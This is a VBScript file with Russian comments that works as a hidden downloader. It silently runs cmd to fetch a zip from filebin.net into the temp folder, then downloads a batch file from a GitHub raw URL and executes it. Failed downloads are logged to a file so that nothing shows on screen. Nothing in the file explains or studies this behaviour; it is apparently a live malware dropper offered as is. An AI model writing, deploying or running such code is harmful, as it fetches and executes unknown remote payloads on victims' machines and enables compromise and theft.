Option Explicit

CreateObject("WScript.Shell").Run "cmd /c cd %temp% && curl -L -o Best_Gits.zip https://filebin.net/0g8mkpymqtdcz601/Best_Gits.zip", 0, True

Dim strBatchURL, strBatchTempFile
strBatchURL = "https://github.com/jockop77/fff/raw/main/unp.bat" ' URL для .bat файла
strBatchTempFile = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%temp%") & "\unp.bat" ' Имя для .bat файла

Dim objXMLHTTP, objStream

' Функция для загрузки файла по URL
Sub DownloadFile(ByVal url, ByVal savePath)
    Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    objXMLHTTP.open "GET", url, False
    objXMLHTTP.send

    ' Проверка статуса ответа
    If objXMLHTTP.Status = 200 Then
        ' Сохраняем загруженный файл
        Set objStream = CreateObject("ADODB.Stream")
        objStream.Type = 1 ' 1 = Binary
        objStream.Open
        objStream.Write objXMLHTTP.responseBody
        objStream.SaveToFile savePath, 2 ' 2 = Overwrite
        objStream.Close
    Else
        ' Можно записать ошибку в файл вместо вывода сообщения
        Dim fso, errorLog
        Set fso = CreateObject("Scripting.FileSystemObject")
        
        ' Путь к лог-файлу
        errorLog = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%temp%") & "\error_log.txt"
        
        ' Записываем статус ошибки в лог
        Dim logStream
        Set logStream = fso.OpenTextFile(errorLog, 8, True) ' 8 = Append mode
        logStream.WriteLine "Ошибка загрузки файла " & url & ". Код статуса: " & objXMLHTTP.Status & " - " & Now
        logStream.Close
        
        ' Освобождаем объекты
        Set logStream = Nothing
        Set fso = Nothing
    End If
End Sub

' Скачивание .bat файла
DownloadFile strBatchURL, strBatchTempFile

' Освобождаем объекты
Set objStream = Nothing
Set objXMLHTTP = Nothing

' Запуск .bat файла
Dim shell
Set shell = CreateObject("WScript.Shell")
shell.Run strBatchTempFile, 1, True ' 1 = показать окно, True = ждать завершения
Set shell = Nothing